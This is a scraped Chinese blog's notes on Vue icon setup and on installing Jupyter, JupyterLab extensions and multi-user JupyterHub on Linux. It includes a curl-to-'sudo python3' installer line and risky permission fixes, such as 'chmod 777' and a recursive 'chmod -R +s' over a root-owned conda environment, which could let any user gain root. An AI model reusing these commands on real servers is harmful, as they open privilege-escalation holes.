\u0026lt;template\u0026gt; \u0026lt;div\u0026gt; \u0026lt;el-icon :size=\u0026#34;size\u0026#34; :color=\u0026#34;color\u0026#34;\u0026gt; \u0026lt;Edit /\u0026gt; \u0026lt;/el-icon\u0026gt; \u0026lt;!-- Or use it independently without derive attributes from parent --\u0026gt; \u0026lt;Edit /\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/template\u0026gt; 自定义图标 参考链接：\nhttps://blog.csdn.net/weixin_42117267/article/details/112161481\n引入在线字体Iconfont（阿里图标库）：\nhttps://at.alicdn.com/t/font_830376_qzecyukz0s.css\nindex.html\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 \u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html lang=\u0026#34;en\u0026#34;\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta charset=\u0026#34;UTF-8\u0026#34; /\u0026gt; \u0026lt;link rel=\u0026#34;icon\u0026#34; href=\u0026#34;/favicon.ico\u0026#34; /\u0026gt; \u0026lt;meta name=\u0026#34;viewport\u0026#34; content=\u0026#34;width=device-width, initial-scale=1.0\u0026#34; /\u0026gt; \u0026lt;title\u0026gt;Vite App\u0026lt;/title\u0026gt; \u0026lt;link rel=\u0026#34;stylesheet\u0026#34; href=\u0026#34;https://at.alicdn.com/t/font_830376_qzecyukz0s.css\u0026#34;\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;div id=\u0026#34;app\u0026#34;\u0026gt;\u0026lt;/div\u0026gt; \u0026lt;script type=\u0026#34;module\u0026#34; src=\u0026#34;/src/main.ts\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; icon.css\n1 2 3 4 [class*=\u0026#34; el-icon-lx\u0026#34;], [class^=el-icon-lx] { font-family: lx-iconfont !important; } SVG图标 参考链接：\n通过vite-plugin-svg-icons 使用SVG图片\n","permalink":"https://chance7bin.github.io/posts/note/vue%E9%A1%B9%E7%9B%AE%E6%90%AD%E5%BB%BA/","summary":"**注意：**该笔记记录的是 Vue3 + TypeScript 的项目搭建流程 参考链接： RuoYi(若依开源框架)-前后端分离版-前端流程简单分析 https://github.com/lin-xin/vue-manage-system https://github.com/Armour/vue-typescript-admin-template vue-typesc","title":"Vue项目搭建"},{"content":"Jupyter初探 Jupyter Notebook介绍、安装及使用教程\nJupyter使用详解\nJupyter notebook安装 安装了Anaconda发行版时已经自动安装了Jupyter Notebook\n直接打开命令窗口，输入jupyter notebook启动jupyter notebook\n在浏览器输入url即可进入jupyter\n这些所列的文件目录都存放在直接打开cmd时的初始目录下\n设置Jupyter Notebook文件存放位置 创建配置文件\n1 jupyter notebook --generate-config 修改配置文件\n搜索c.NotebookApp.notebook_dir，设置文件的默认存储位置\n启动时出现的问题：\n[W 14:06:44.163 NotebookApp] 404 GET /api/kernels/39fc6aa7-5b95-4bc9-b561-b524370dbcd4/channels?session_id=0794ad0158734a7096f06b73e6d8cfd2 (127.0.0.1): Kernel does not exist: 39fc6aa7-5b95-4bc9-b561-b524370dbcd4\n解决方案：\n1 pip install --upgrade ipykernel 保存和检查点(checkpoint) 在开始前，要记得定时保存文件，这可以直接采用快捷键 Ctrl + S 保存文件，它是通过一个命令\u0026ndash;“保存和检查点”实现的，那么什么是检查点呢？\n每次创建一个新的 notebook，同时也创建了一个 checkpoint 文件，它保存在一个隐藏的子文件夹 .ipynb_checkpoints 中，并且也是一个 .ipynb 文件。默认 Jupyter 会每隔 120 秒自动保存 notebook 的内容到 checkpoint 文件中，而当你手动保存的时候，也会更新 notebook 和 checkpoint 文件。这个文件可以在因为意外原因关闭 notebook 后恢复你未保存的内容，可以在菜单中 File-\u0026gt;Revert to Checkpoint 中恢复。\n拓展功能 关联jupyter与conda环境 有两种方式关联\nnb_conda 关联Jupyter Notebook和conda的环境和包——“nb_conda”\nJupyter Notebook中切换conda虚拟环境\n① 安装\n1 conda install nb_conda ② 使用\n可以在Conda类目下对conda环境和包进行一系列操作。\n可以在笔记本内的“Kernel”类目里的“Change kernel”切换内核。\n③ 卸载\n1 conda remove nb_conda 执行上述命令即可卸载nb_conda包。\nJupyter notebook怎么使用自己新建的conda环境\n以下操作都在命令行中操作：\n1 conda create -n tensorflow_study python=3.6 tensorflow_study是我新建环境的名字，你的环境名字自己根据情况取；python版本也根据自己的需求来选择。\n1 conda activate tensorflow_study 进入新建的环境\n1 conda install nb_conda 安装nb_conda是为了实现不同环境的切换与选择。\n1 Jupyter notebook ==错误1：EnvironmentLocationNotFound: Not a conda environment==\n打开jupyter后点击Conda会弹出这样的错误：\n解决方法：\n找到Anaconda安装路径下nb_conda库的envmanager.py文件\nwin系统在目录：Anaconda3\\Lib\\site-packages\\nb_conda\\envmanager.py\nlinux系统在目录：Anaconda3/pkgs/nb_conda-2.2.1-py36_0/lib/python3.6/site-packages/nb_conda/envmanager.py\n找到该文件后在83~86行有这样一段代码：\n1 2 3 4 return { \u0026#34;environments\u0026#34;: [root_env] + [get_info(env) for env in info[\u0026#39;envs\u0026#39;]] } 我们将此段代码改成如下：\n1 2 3 return { \u0026#34;environments\u0026#34;: [root_env] + [get_info(env) for env in info[\u0026#39;envs\u0026#39;] if env != root_env[\u0026#39;dir\u0026#39;]] } 然后重启jupyter就可以了。\n==错误2：可使用的环境没有我新创建的jupyter环境==\n==nb_conda 要装到你的虚拟环境中才会在jupyter notebook中显示！！！！！！==\n如何在 Jupyter Notebook 中切换/使用 conda 虚拟环境\n使用 nb_conda_kernels 添加所有环境\n这个方法就是一键添加所有 conda 环境\n1 2 3 4 5 6 7 conda activate my-conda-env # this is the environment for your project and code conda install ipykernel conda deactivate conda activate base # could be also some other environment conda install nb_conda_kernels jupyter notebook 注意：这里的 conda install nb_conda_kernels 是在 base 环境下操作的。\n安装好后，打开 jupyter notebook 就会显示所有的 conda 环境啦，点击随意切换。\nipykernel 1、直接在新建一个环境的同时，给该环境安装ipykernel\n1 2 conda create -n 新环境名称 python=3.7 ipykernel # eg: conda create -n new python=3.7 ipykernel 2、激活虚拟环境\n1 2 source activate 环境名称 # eg: source activate new 3、将该环境写入jupyter的kernel中\n1 2 python -m ipykernel install --user --name 环境名称 --display-name \u0026#34;你想在jupyter中显示的该环境的名称\u0026#34; # eg: python -m ipykernel install --user --name new --display-name \u0026#34;jupyter环境\u0026#34; 4、进入jupyter 服务器\n1 jupyter notebook 安装插件 首先安装扩展库\n1 2 3 conda install -c conda-forge jupyter_contrib_nbextensions jupyter contrib nbextensions install --user conda install -c conda-forge jupyter_nbextensions_configurator -c conda-forge是指明在库conda-forge中下载jupyter_contrib_nbextensions\n1.Markdown生成目录\n不同于有道云笔记的Markdown编译器，Jupyter Notebook无法为Markdown文档通过特定语法添加目录，因此需要通过安装扩展来实现目录的添加。\n1 conda install -c conda-forge jupyter_contrib_nbextensions -c conda-forge是指明在库conda-forge中下载jupyter_contrib_nbextensions\n执行上述命令后，启动Jupyter Notebook，你会发现导航栏多了“Nbextensions”的类目，点击“Nbextensions”，勾选“Table of Contents ⑵”\n之后再在Jupyter Notebook中使用Markdown，点击下图的图标即可使用啦。\n==遇到的问题：==\n插件不显示\n解决方法：\njupyter nbextensions configurator不显示插件\n再执行如下命令\n1 2 conda install -c conda-forge jupyter_nbextensions_configurator jupyter contrib nbextensions install --user 2.代码自动补全扩展\n勾选 Hinterland\n安装插件后出现警告“Config option template_path not recognized by LenvsLatexExporter”\n原因是nbconvert6.0.0版本以上的某些参数的名称发生了更改，与原先版本不兼容，需要将版本降低到5.6.1\n1 pip install nbconvert==5.6.1 -i https://pypi.mirrors.ustc.edu.cn/simple jupyter代码自动补全插件、安装后出现警告“Config option template_path not recognized by LenvsLatexExporter”的解决方案\n3.主题\n4.Autopep8\n这是一个将代码按照PEP8进行格式化的插件，前提是需要通过pip install autopep8安装autopep8，安装完之后需要重启jupyter notebook服务才能生效。同样在Nbextention选项卡中勾选Autopep8，在工具栏中会多一个“锤子”一样的按钮，可以帮助我们排版代码，使其符合pep8标准。\n5.Variable inspector\n该插件可以帮助我们查看当前notebook中所有的变量的名称，类型，大小和值。省去了df.shape，type()等语句的执行，也代替了前文提到的魔法函数“%whos”的执行，读者可以自行尝试一下。\n6.Code folding\n顾名思义，该插件可以对代码进行一定的折叠，例如遇到class，def等关键字，而且主体代码又很长时，折叠代码会方便阅读，这一点也让jupyter notebook更像一个IDE。\n7.Execute time\n该插件可以显示每一个cell中代码的执行时间。\n除此之外还有一些其他常见的插件扩展，例如Notify，Collapsible headings等，读者可以自行探索查看，并配置使用。\nJupyter快捷键 加载指定网页源代码 1 %load URL 其中，URL为指定网站的地址。\n加载本地Python文件 1 %load Python文件的绝对路径 注意\nPython文件的后缀为“.py”。 “%load”后跟的是Python文件的绝对路径。 输入命令后，可以按CTRL 回车来执行命令。第一次执行，是将本地的Python文件内容加载到单元格内。此时，Jupyter Notebook会自动将“%load”命令注释掉（即在前边加井号“#”），以便在执行已加载的文件代码时不重复执行该命令；第二次执行，则是执行已加载文件的代码。 直接运行本地Python文件 执行命令：\n1 %run Python文件的绝对路径 或\n1 !python3 Python文件的绝对路径 或\n1 !python Python文件的绝对路径 注意\nPython文件的后缀为“.py”。 “%run”后跟的是Python文件的绝对路径。 “!python3”用于执行Python 3.x版本的代码。 “!python”用于执行Python 2.x版本的代码。 “!python3”和“!python”属于 !shell命令 语法的使用，即在Jupyter Notebook中执行shell命令的语法。 输入命令后，可以按 control return 来执行命令，执行过程中将不显示本地Python文件的内容，直接显示运行结果。 在Jupyter Notebook使用shell命令 ① 方法一——在笔记本的单元格中\n⑴ 语法\n1 !shell命令 在Jupyter Notebook中的笔记本单元格中用英文感叹号“!”后接shell命令即可执行shell命令。 1 !pip install jieba ② 方法二——在Jupyter Notebook中新建终端\n⑴ 启动方法\n在Jupyter Notebook主界面，即“File”界面中点击“New”；在“New”下拉框中点击“Terminal”即新建了终端。此时终端位置是在你的home目录，可以通过pwd命令查询当前所在位置的绝对路径。\n⑵ 关闭方法\n在Jupyter Notebook的“Running”界面中的“Terminals”类目中可以看到正在运行的终端，点击后边的“Shutdown”即可关闭终端。\nJupyterLab JupyterLab最全详解，如果你还在使用Notebook，那你就out了！\nJupyter Notebook是一个交互式笔记本，支持运行 40 多种编程语言。Jupyter Notebook 的本质是一个 Web 应用程序，便于创建和共享文学化程序文档，支持实时代码、数学方程、可视化和 markdown，用途包括：数据清理和转换，数值模拟，统计建模，机器学习等等 。\nJupyterLab是Jupyter主打的最新数据科学生产工具，在一定程度上是为了取代Jupyter Notebook。它支持安装插件以及有着更好的界面。而 JupyterHub是为多个用户提供Jupyter Notebook的最佳方式。\nJupyter NoteBook / JupyterLab / JupyterHub 区别与关系简介\n搭建环境方案（根据需求调整）：\n线上环境：The Littlest JupyterHub + JupyterLab 开发环境：JupyterHub + JupyterLab Tips\n当前版本的 Jupyter Lab 网页版可视化界面虽然用起来很方便，但是也存在很多问题，==目前最好的解决方法是尽量将对 Jupyter Lab 有改动的操作自己在 Anaconda Prompt 下进行==，最主要的原因就是==即使发生了问题，也可以从Prompt中直观的看到错误原因甚至解释==。这对于解决问题其实是至关重要的一环。\n安装 1 2 3 4 5 #创建环境 conda create --name env_name python=x.x -y conda activate env_name #安装jupyterlab conda install -c conda-forge jupyterlab 在命令行使用jupyter-lab或jupyter lab命令运行Jupyter lab\n作为官方宣传的jupyter lab3.0版本后最大的改变，似乎我们可以不需要nodejs，不通过jupyter labextension install语句，仅仅依靠pip/conda/mamba就可以安装拓展\n1 pip install \u0026#34;jupyterlab-kite\u0026gt;=2.0.2\u0026#34; Jupyter Lab配置\n使用命令创建配置文件，其会生成C:\\Users\\用户名\\.jupyter\\jupyter_notebook_config.py或者/home/用户名/.jupyter/jupyter_notebook_config.py\n1 jupyter lab --generate-config 控制台出现的各种警告 安装插件后出现警告“Config option template_path not recognized by LenvsLatexExporter”\n原因是nbconvert6.0.0版本以上的某些参数的名称发生了更改，与原先版本不兼容，需要将版本降低到5.6.1\n1 pip install nbconvert==5.6.1 -i https://pypi.mirrors.ustc.edu.cn/simple ClobberError: This transaction has incompatible packages 或者The package ‘xxx‘ cannot be installed due==（未解决）==\n原因：conda和pip等相关包的版本太低，自动更新不能用。 解决方案：在命令行中输入以下命令：==（没效果）==\n1 2 conda clean --all conda update --all Failed validating \u0026lsquo;additionalProperties\u0026rsquo; in schema:==（未解决）==\nWARNING | Config option kernel_spec_manager_class not recognized by LabBuildApp==（未解决）==\n如果出现\n可以先更新pip\n1 python -m pip install --upgrade pip 插件 强烈推荐JupyterLab 6个\u0026quot;精英\u0026quot;插件\n15个好用到爆炸的Jupyter Lab插件\n==nodejs版本不能过低==\n同时！！\n==外部的node环境好像不生效，要在conda环境中装node==\n在anaconda prompt中运行下面的语句安装nodejs：\nconda install -c conda-forge nodejs\u0026lt;15\n其次需要注意的一点是：nodejs最好选择14.x.x版本，如果选择了16.x.x可能会遇到各种奇葩问题 。（这是个大坑）\n还有，建议用官方默认源来下载npm资源，yarn同理。别用taobao的源。\ntaobao的源有些不对，也会导致资源下载不成功。而且taobao在2022年5月要改域名了。\n1.jupyterlab-code-snippets（没安装成功）\n1 jupyter labextension install jupyterlab-code-snippets 报错：\n==外部的node环境好像不生效，要在conda环境中装node==\n==遇到的问题：==\n安装之后无法使用\n解决方法：\nelyra-code-snippet-extension（安装成功）\n1 pip install elyra-code-snippet-extension 如果出现\n可以先更新pip\n1 python -m pip install --upgrade pip 1 conda install -c conda-forge elyra-code-snippet-extension \u0026amp;\u0026amp; jupyter lab build 👆命令装不了\n==控制台安装出错==\n==页面安装出错==\ncode snippets存储路径：$JUPYTER_DATA_DIR/metadata/code-snippets\n1 $ jupyter --data-dir 2.jupyter lsp（安装成功）\njupyter lab 代码提示 代码补全插件 jupyter lsp 配置教程 ：Hinterland mode\n1.安装JupyterLab-lsp\n1 pip install jupyter-lsp 2.安装python-lsp-server\n1 pip install python-lsp-server[all] 3.安装frontend extension\n1 jupyter labextension install @krassowski/jupyterlab-lsp 3.或者启动 jupyter lab，在插件中搜索lsp，点击@krassowski/jupyterlab-lsp下的install安装\n4.点击OK\n5.重新进入jupyter lab，输入代码时按tab键，就可以使用代码提示啦 。\n若想实现jupyter notebook中类似Hinterland mode的自动提示，还需进行下面的设置\n6.依次点击Settings\u0026ndash;\u0026gt;Advanced Settings Editor\n7.选择Code Completion，在右侧输入如下代码，并保存，即可开启Hinterland mode\n1 2 3 { \u0026#34;continuousHinting\u0026#34;: true } ==可能会出现如下问题：==\n3.ipywidgets（安装成功）\n生成控件(下拉菜单, 滑条等等), 非常方便手动调参, 因为会即使反馈, 根据反馈不断调整参数\n先用pip安装ipywidgets: pip install ipywidgets\n用这个命令（指定为版本7）：pip install ipywidgets==7\n这样安装会出现如下问题：\n**解决方法（这个方法没解决）：**https://www.coder.work/article/3135992\nipywidget 7.5 破坏了 jupyter lab，它也影响了其他库。\nhttps://github.com/plotly/plotly.py/issues/1659\n降级到 7 解决\n安装完成后在Jupyter Notebook中激活：\n1 jupyter nbextension enable --py widgetsnbextension 如果使用Jupyterlab，运行以下代码：\n1 jupyter labextension install @jupyter-widgets/jupyterlab-manager 在Notebook中导入并使用ipywidgets：\n1 2 import ipywidgets as widgets from ipywidgets import interact, interact_manual 交互式控件入门\n假设我们有一个数据框(dataframe)，包含Medium文章的统计信息：\n如何查看总阅读次数超过1000的文章？\n1 df.loc[df[\u0026#39;reads\u0026#39;] \u0026gt; 1000] 如果要显示点赞超过500的文章，必须编写一行新的代码：\n1 df.loc[df[\u0026#39;claps\u0026#39;] \u0026gt; 500] 如果不用编写更多代码就可以快速更改这些参数，那不是很好吗？尝试ipywidgets：\n1 2 3 @interact def show_articles_more_than(column=\u0026#39;claps\u0026#39;, x=5000): return df.loc[df[column] \u0026gt; x] 4.jupyterlab_variableinspector（安装成功）\njupyterlab-variableInspector帮助我们在jupyter lab中查看当前环境中存在的变量相关信息，以美观的界面形式对多种类型的对象予以呈现\n1 2 3 4 conda config --add channels conda-forge conda config --set channel_priority strict conda install jupyterlab-variableinspector 如果遇到Solving environment: failed with initial frozen solve. Retrying with flexible solve.参考下面这个博客\nhttps://blog.csdn.net/Sakura_Logic/article/details/108312146\n👇方式安装失败\n1 jupyter labextension install @lckr/jupyterlab_variableinspector ==这个插件build会失败==\n5.代码折叠\n设置如下：codeFolding：true，即可见代码折叠\n6.kite（没安装成功）\nkite插件是能够对代码块进行自动补充和对函数参数进行解释的插件。\n1 pip install \u0026#34;jupyterlab-kite\u0026gt;=2.0.2\u0026#34; 安装出错：缺少对应的wheel\n启动时出错\n7.elyra（未安装）\n搭建工作流\nelyra——jupyter lab平台最强插件集\n8.jupyterlab_code_formatter（安装成功）\n1 conda install -c conda-forge jupyterlab_code_formatter 或使用jupyter页面安装\n如果python版本过高会无法使用\n**解决方法：**运行jupyter server extension enable --py jupyterlab_code_formatter并重启jupyter lab\nJupyterHub JupyterHub有两种部署方式：\nThe Littlest JupyterHub Zero to JupyterHub with Kubernetes When to use The Littlest JupyterHub\n安装 安装教程：\nQuickstart\njupyterhub 安装教程\n1.安装miniconda\nhttps://www.jianshu.com/p/47ed480daccc\n解决方案：\n打开一个终端，然后输入命令行打开bashrc文件：\n1 sudo gedit ~/.bashrc 注意这里要有sudo，不然无法编辑里面的内容。\n打开自己的安装目录/opt/software/miniconda3/bin，输入指令pwd查看路径。\n在bashrc文件中输入：\n1 export PATH=\u0026#34;/opt/software/miniconda3/bin:$PATH\u0026#34; 保存关闭bashrc文件，在命令行输入：\n1 source ~/.bashrc 随后检测一下：\n1 conda --version 如上图所示，成功。\n2.安装JupyterHub\npip, npm:\n1 2 3 python3 -m pip install jupyterhub npm install -g configurable-http-proxy python3 -m pip install jupyterlab notebook # needed if running the notebook servers in the same environment 建立软连接\n1 ln -s /opt/software/node-v14.8.0-linux-x64/bin/configurable-http-proxy /usr/bin/configurable-http-proxy conda (one command installs jupyterhub and proxy):\n1 2 conda install -c conda-forge jupyterhub # installs jupyterhub and proxy conda install jupyterlab notebook # needed if running the notebook servers in the same environment 测试是否安装成功\n1 2 jupyterhub -h configurable-http-proxy -h 3.启动jupyterhub\n命令行输入\n1 jupyterhub 浏览器输入http://localhost:8000(localhost可换成服务器ip)，通过服务器的用户登录（非root，root默认是无法登录的）\n==遇到的问题：==\n使用pip安装启动jupyterhub时，找不到 \u0026lsquo;configurable-http-proxy\u0026rsquo;\n建立软连接\n1 ln -s /opt/software/node-v14.8.0-linux-x64/bin/configurable-http-proxy /usr/bin/configurable-http-proxy 多用户需求 Get Started\n多用户多环境Jupyter notebook解决方案\n[Centos/Jupyterhub] 多用户远程登录 Jupyter 详细配置\nAuthentication and User Basics\n安装 JupyterHub 踩坑指南 —— 如何通过 JupyterHub 实现多用户管理\n默认情况下，要真正的实现分配用户账号，需要满足以下两点要求：\nc.Authenticator.whitelist 指定了用户名 在系统中创建了该用户（adduser / useradd） tips: 默认情况下，密码为系统中该用户对应的密码\nJupyterHub支持多种Spawner，可以启动LocalProcess（默认）的JupyterLab，docker容器版的JupyterLab，也可以启动Kubernetes(k8s)集群Pod版的JupyterLab、Hadoop Yarn上的JupyterLab等等。\n针对测试或者自己单用户使用，默认的LocalProcess就可以；若多用户不是很多，隔离性也没那么高要求的，LocalProcess也能满足；如果有意向大量不确定用户提供，还是使用docker容器或者k8s版本的比较好，隔离性好，也能限制资源用量。\n新增用户 每个用户的环境都是独立的\npip install都是安装在 /home/用户/.local/lib/python3.7/site-packages/下\n登录 ==登录时遇到的问题：==\n登录普通用户的时候日志报错\n在输入node -v 时显示未找到命令，而且 configurable-http-proxy 也没了\n软连接失效\n删除软连接，新建软连接，==手动输入==\n==解决方法：新建一个环境！！！重复上述操作==\n配置文件设置 生成配置文件\n1 jupyterhub --generate-config 这个命令会在你的当前目录下生成一个jupyterhub_config.py文件，接下来我们需要在这个文件中配置我们的网络和用户管理。（建议放在编撰的UNIX文件系统位置：/etc/jupyterhub）\n1 jupyterhub -f /etc/jupyterhub/jupyterhub_config.py 上述命令可以根据你的配置文件启动jupyterhub。\n在存放jupyterhub_config.py的文件夹下执行jupyterhub启动服务\n配置 jupyterhub_config.py\n1 c.Spawner.notebook_dir = \u0026#39;/home/cqb/jupyter_workspace\u0026#39; #jupyterhub自定义目录 c.Spawner.notebook_dir设置之后新建工程出现Permission denied: 未命名.ipynb\n==解决方法：==\n修改该文件夹的权限：chmod 777 jupyter_workspace/\n1 2 chmod 770 jupyter_workspace/ chmod +s jupyter_workspace/ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 # c.Spawner.default_url = \u0026#39;/lab\u0026#39; # /lab对应jupyterlab 默认为notebook # c.JupyterHub.port = 80 # 指定暴露端口 c.Authenticator.allowed_users = {\u0026#39;user1\u0026#39;, \u0026#39;user002\u0026#39;, \u0026#39;user003\u0026#39;} # 指定可使用用户 # PAMAuthenticator.whitelist is deprecated in JupyterHub 1.2, use PAMAuthenticator.allowed_users instead c.LocalAuthenticator.create_system_users = True c.Authenticator.admin_users = {\u0026#39;root\u0026#39;, \u0026#39;cqb\u0026#39;} # 指定admin用户 # c.JupyterHub.statsd_prefix = \u0026#39;jupyterhub\u0026#39; # c.Spawner.cmd=[\u0026#39;jupyterhub-singleuser\u0026#39;] c.Spawner.notebook_dir = \u0026#39;~/jupyter_workspace\u0026#39; # 每个用户有单独的工作空间(但是前提是需提前创建好文件夹) # c.LocalAuthenticator.group_whitelist = {\u0026#39;group1\u0026#39;} # c.JupyterHub.statsd_prefix = \u0026#39;jupyterhub\u0026#39; # 为jupyterhub 添加额外服务，用于处理闲置用户进程。安装jupyterhub-ilde-culler：pip install jupyterhub-ilde-culler（jupyterhub-ilde-culler安装不了） c.JupyterHub.services = [ { \u0026#39;name\u0026#39;: \u0026#39;idle-culler\u0026#39;, \u0026#39;command\u0026#39;: [\u0026#39;python3\u0026#39;, \u0026#39;-m\u0026#39;, \u0026#39;jupyterhub_idle_culler\u0026#39;, \u0026#39;--timeout=3600\u0026#39;], \u0026#39;admin\u0026#39;:True # 1.5.0 需要服务管理员权限，去kill 部分闲置的进程notebook, 2.0版本已经改了，可以只赋给 idel-culler 部分特定权限，roles } ] 设置管理员，管理员能够查看和启停所有用户的servers\n1 c.Authenticator.admin_users = set([\u0026#39;admin\u0026#39;]) 设置普通用户，管理员用户不需要加入白名单\n1 c.Authenticator.whitelist = set([\u0026#39;user1\u0026#39;, \u0026#39;user2\u0026#39;, \u0026#39;user3\u0026#39;]) 注意事项\n==须在root管理员下启动jupyterhub，才可以实现多用户（否则会出现权限不足和有些用户无法登录的情况）==；\n==user1登录失败==\n没有权限访问jupyter_workspace文件夹 No such notebook dir: '/home/cqb/jupyter_workspace'\n工作空间配置 工作空间分为共享工作空间（多用户共用一个文件夹）或者是用户独享工作空间\n共享工作空间 共享的话要配置 Linux多用户共同使用同一目录\nhttps://blog.csdn.net/catscanner/article/details/105129846\n例如有alex，bob两个用户，互相无法访问对方的home~文件夹，为了共享文件，可以让root用户在/home中创建一个shared文件夹，然后创建一个用户组dev01\n在root或者sudo下：\n1 groupadd dev01 创建用户组之后添加文件夹并为文件夹更改组\n1 2 mkdir /home/dev_shared chgrp dev01 /home/dev_shared 接下来更改文件夹权限，使得owner以及用户组可以访问,+s是为了确保之后添加进去的文件夹也继承同样的权限\n1 2 chmod 770 /home/dev_shared chmod +s /home/dev_shared 然后将需要共享文件的用户添加到dev01这个用户组\n1 2 usermod -a -G dev01 alex usermod -a -G dev01 bob 注意，使用root环境运行su - ， 而不是root权限su\n至此，两人都可以访问/home/dev_shared文件夹了\n另外，用户可以自行检查自己所在的用户组\n1 groups 如果是全新的账户，root用户可以先建立新用户：\n1 2 useradd alex passwd alex 使用root权限查看所有的group情况\n1 cat /etc/group 独享工作空间 独享的话配置文件设置 c.Spawner.notebook_dir = '~/jupyter_workspace' 每个用户的文件会放在/home/user/jupyter_workspace下\n==遇到的问题：==\n创建文件的时候报错Permission denied: '/home/shared/jupyter_workspace/.ipynb_checkpoints/untitled-checkpoint.dio'\n.ipynb_checkpoint文件夹没有写权限，注意这个文件夹是 user1 创建的，其他用户没有写权限，所以==用户共享一个工作空间的方案不可行==\n解决方法：\n1 2 chmod 770 .ipynb_checkpoints chmod +s .ipynb_checkpoints 注意：\n其他用户创建的文件是无法保存的（既然这样子，那其实就没有必要让用户共享工作空间，因为文件并不能被修改，可以用户拥有自己的工作空间，同时创建一个共享文件夹，用户将需要共享的文件放到该共享文件夹让对方调用）\n用户安装插件 只能使用 pip install 安装\n用户登录的时候通过pip install都是安装在 /home/用户/.local/lib/python3.7/site-packages/下的，各用户的环境都是隔离的\n因为只允许非root用户登录\n无法通过conda install安装，因为安装目录是在 /opt/software/miniconda3/envs/jupyterhub1 ，用户无写权限\n同样的，插件在web界面也是无法进行安装的（conda install无权限）\n若是允许用户安装插件，可将插件安装所在文件夹共享出来，指定特定的组权限可写\n1 2 3 4 chgrp -R shared /opt/software/miniconda3/envs/jupyterhub chmod -R 775 /opt/software/miniconda3/envs/jupyterhub chmod -R +s /opt/software/miniconda3/envs/jupyterhub ==遇到的问题：==\n文件权限设置完成后，通过命令安装插件\n1 !conda install -c conda-forge jupyterlab-drawio -y ==输入上面这个命令之后jupyterhub就启动不起来了！！！****==\nnode:error while loading shared libraries: libnode.so.83\nerror while loading shared libraries的解決方法\n==解决思路：==\n输入node -v可以看到同样的错误，可能是安装的node有问题，把之前通过pip安装的node卸载掉==（pip和conda 安装的都要卸载掉）==，通过tar包重新安装\n重新安装建立软连接后是可以输入node -v，但是安装jupyterhub之后他会自带一个nodejs，还是会报错\n猜测的原因是conda 安装的jupyterhub自带的nodejs可能有问题\n通过pip的方式安装jupyterhub可以解决该问题\nLinux 上安装 Node.js 1 2 3 wget https://nodejs.org/dist/v14.8.0/node-v14.8.0-linux-x64.tar.gz // 下载 tar -xzvf node-v14.8.0-linux-x64.tar.gz // 解压 cd node-v14.8.0-linux-x64 // 进入解压目录 ==下面这个修改配置文件的方法不能生效==\n解压文件的 bin 目录底下包含了 node、npm 等命令，我们可以修改linux系统的环境变量（profile）来设置直接运行命令：\n老规矩先备份，养成修改重要文件之前先备份的好习惯。\n1 cp /etc/profile /etc/profile.bak 然后 vim /etc/profile，在最下面添加 export PATH=$PATH: 后面跟上 node 下 bin 目录的路径\n1 export PATH=$PATH:/opt/software/node-v14.8.0-linux-x64/bin 立即生效\n1 2 3 source /etc/profile [root@localhost ~]# node -v v14.8.0 OK！安装成功！\n==建立软连接才能生效==\n1 2 3 4 5 6 root@qingbin-virtual-machine:/opt/softeware# ln -s /opt/softeware/node-v14.8.0-linux-x64/bin/node /usr/local/bin/ root@qingbin-virtual-machine:/opt/softeware# node -v v14.8.0 root@qingbin-virtual-machine:/opt/softeware# ln -s /opt/softeware/node-v14.8.0-linux-x64/bin/npm /usr/local/bin/ root@qingbin-virtual-machine:/opt/softeware# npm -v 6.14.7 删除软连接：\n进入软连接目录\nrm ./node\n==遇到的问题：==\n直接通过web在插件模块install的话会出现如下错误，但是我启动jupyterhub的环境下已经安装了nodejs了，不知道为什么会出现该错误\n解决方法：\n在linux中自己安装node，不要用自带的node环境\n阿里天池的环境安装解决方案 阿里天池可以通过 pip install 安装环境/插件（python环境安装在/data/nas/workspace/envs/python3.6/site-packages/）\n阿里天池也没有办法通过插件模块install安装\n阿里天池也没有办法用命令!conda install -c conda-forge jieba -y安装环境\n阿里天池也没有办法用命令!conda install -c conda-forge jupyterlab-drawio -y安装插件\nColab的环境安装解决方案 可通过pip install安装环境（python环境安装在/usr/local/lib/python3.7/dist-packages/），但是无法通过conda install，没有安装插件的模块\n==Colab可以在输出端输入y执行之后的操作，但是阿里天池不可以==\nColab\n阿里天池\nThe Littlest JupyterHub The Littlest JupyterHub currently supports Ubuntu(18.04) Linux only\n每个 JupyterHub 用户都会在首次启动服务器时创建自己的 Unix 用户帐户。这可以保护用户彼此之间，在/home为他们提供一个主目录，并允许基于文件系统权限进行共享。\n安装TLJH The Littlest JupyterHub\n【TLJH】the-littlest-jupyterhub国内搭建和配置详细教程\nconda 阿里源_Littlest JupyterHub| 01 Littlest JupyterHub 阿里云搭建\n1.确保python3, python3-dev, curl 和 git 都已经安装\n1 sudo apt install python3 python3-dev git curl 2.安装\n下面这个安装不了，因为代码里面有GitHub的地址，下载很慢\n1 curl -L https://tljh.jupyter.org/bootstrap.py | sudo -E python3 - --admin \u0026lt;admin-user-name\u0026gt; ==遇到的问题：==\n启动报错\n安装程序都做了些什么 What does the installer do?\nTLJH创建的目录需要root权限/opt/tljh\nHub的环境安装在/opt/tljh/hub下，同时还包含了traefik（Træfik 是一个为了让部署微服务更加便捷而诞生的现代HTTP反向代理、负载均衡工具。 它支持多种后台 (Docker, Swarm, Kubernetes, Marathon, Mesos, Consul, Etcd, Zookeeper, BoltDB, Rest API, file…) 来自动化、动态的应用它的配置文件设置）\n用户环境安装在 /opt/tljh/user，这包含用于启动所有用户的notebook接口，以及所有用户可用的各种包。这个环境归root用户所有。\n不使用JupyterHub的原因 Jupytherhub的每个用户都是一个linux的用户，每个用户之间基于文件系统权限进行共享，用户的操作权限基本是遵循linux的规范，这不方便我们对用户的控制，开发环境、文件的管理与共享\nJupyter集成的应用 集成Jupyter notebook的工具或平台\n==集成的是Jupyter lab，通过Docker实现的，将一个外部目录挂载到容器中==\n阿里天池大数据 如何在天池学习、运行教程代码\nGoogle Colab https://colab.research.google.com/\nJupyter二次开发 